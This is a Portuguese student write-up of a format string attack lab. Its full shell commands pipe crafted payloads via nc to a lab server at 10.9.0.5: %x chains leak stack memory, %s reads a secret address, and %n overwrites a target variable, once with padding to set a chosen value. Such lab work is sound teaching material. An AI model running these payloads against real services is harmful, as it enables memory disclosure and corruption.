# Trabalho realizado na semana 6 e 7

## Format string Attack Lab (Tarefas obrigatórias)

### Tarefa 1

- Foi criado um ficheiro com o input, enviando para o servidor com cat <file> | nc 10.9.0.5 9090
- Tentamos várias maneiras, e o resultado era o esperado ( " (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ) " )
- Com com vários "%x" e no final um "%n", o programa deu crash ( nao retornou "Returned  properly" ) e nao deu output do que foi enviado dentro do ficheiro


### Tarefa 2
#### 2.A
- Foram precisos 64 -%x para fazer print aos primeiros 4 bytes do input.

#### 2.B
- Foi alterado o input do 2.A para usar o comando $printf para imprimir o endereco do secret (0x080b4008)
    
##### Comando final

``` bash
echo "$(printf "\x08\x40\x0b\x08")-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x--%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%s" | nc 10.9.0.5 9090 
```

### Tarefa 3 

#### 3.A 
- Para mudar o valor da variavel, foi alterado o "-%s" final para "%n", porque o %n vai escrever o valor do número de caracteres que o antecedem na variável target.
- O resultado final, que foi " 0x0000012e ", significa que existem 302 caracteres antes do %n.
        
##### Comando final
```bash
echo "$(printf "\x68\x50\x0e\x08")-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%n" | nc 10.9.0.5 9090
```
#### 3.B
- Como o %n vai escrever o nºcorrespondente ao nº de caracteres que vem antes temos de escrevê-los.
- Para isso usamos o %.20180x para adicionar + 20180 caracteres aos que vieram antes.

##### Comando final 
```bash
echo "$(printf "\x68\x50\x0e\x08")-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%.20180x-%n" | nc 10.9.0.5 9090
```
